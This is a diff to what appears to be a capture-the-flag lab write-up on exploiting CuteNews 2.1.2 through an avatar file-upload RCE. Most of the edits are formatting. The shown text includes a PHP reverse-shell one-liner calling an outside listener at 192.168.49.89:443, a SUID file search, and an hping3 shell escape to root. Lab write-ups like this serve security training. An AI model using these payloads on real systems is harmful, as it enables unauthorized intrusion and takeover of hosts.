@@ -19,12 +19,12 @@ $ nmap -Pn 192.168.55.128
 
 ### web application
 Use some kind of dir busting tool like gobuster or dirb to identify the `index.php`  
-Cutenews 2.1.2 is installed on the target.
+`cutenews 2.1.2` is installed on the target.
 
 ---
 
 ## exploitation
-```cutenews 2.1.2 is vulnerable to an rce via file upload (https://www.exploit-db.com/exploits/48800)```
+`cutenews 2.1.2` is vulnerable to a [rce](https://www.exploit-db.com/exploits/48800) via file upload.
 
 1. register a new account
 2. perform an avatar upload to upload a shell
@@ -144,7 +144,7 @@ It worked!
 ---
 
 ## post exploitation
-### get reverse shell
+### get a reverse shell
 We are using a simple `PHP` based reverse shell here.  
 payload: ```php -r '$sock=fsockopen("192.168.49.89",443);exec("/bin/sh -i <&3 >&3 2>&3");'```
 
@@ -197,11 +197,13 @@ $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nul
 ```
 Looking on [gtfobins](https://gtfobins.github.io/) on how to exploit `hping3` to get root access
 
+```
 $ /usr/sbin/hping3
 hping3> /bin/sh -p
 # whoami
 root
 ```
+
 We got root!
 
 ### get second flag
@@ -214,4 +216,6 @@ Your flag is in another file...
 # cat proof.txt
 a39413f0559f*********ac83c86deb
 ```
--> ```a39413f0559f**********ac83c86deb```
+-> ```a39413f0559f**********ac83c86deb```  
+  
+Pwned! <@:-)
